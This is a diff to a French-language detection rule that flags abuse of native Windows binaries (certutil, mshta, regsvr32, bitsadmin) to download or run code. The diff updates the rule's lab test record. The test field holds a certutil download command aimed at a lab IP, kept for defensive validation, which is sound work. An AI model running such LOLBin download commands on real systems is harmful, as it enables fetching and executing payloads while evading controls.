@@ -1,11 +1,11 @@
 title: Utilisation de LOLBin pour telechargement ou execution
 id: DM-WIN-009
-status: draft
+status: test
 description: >
   Detecte l'abus de binaires natifs (certutil, mshta, regsvr32, bitsadmin) pour telecharger ou executer du code.
 author: Groupe 2 - Jonas FONTAINE-DEMAY
 date: 2026/11/02
-modified: 2026/11/02
+modified: 2026/11/05
 references:
 - https://attack.mitre.org/techniques/T1218/
 tags:
@@ -92,14 +92,17 @@ investigation:
   - P-NET-CONN
   client_notification: non - qualification sous 8h (SLA MEDIUM)
 tests:
-- date: ''
+- date: 2026/11/04
   environment: lab DC/SRV/Kali
-  command: certutil -urlcache -f http://192.168.10.200/a.txt a.txt
+  command: certutil -urlcache -f http://192.168.20.200/a.txt a.txt
   expected: Alerte MEDIUM dans Splunk puis DFIR-IRIS
-  result: non teste
-  evidence: ''
+  result: 'PARTIEL - branche bitsadmin validee dans DFIR-IRIS. certutil, mshta et regsvr32 sont exclus de la config Sysmon du lab (ProcessCreate onmatch exclude), donc non testables ici'
+  evidence: Tests/validation_environnement/DM-WIN-009.csv
 untestable_reason: ''
 changelog:
 - date: 2026/11/02
   author: Jonas FONTAINE-DEMAY
   change: Creation (draft)
+- date: 2026/11/05
+  author: Jonas FONTAINE-DEMAY
+  change: passage en test apres validation dans le lab
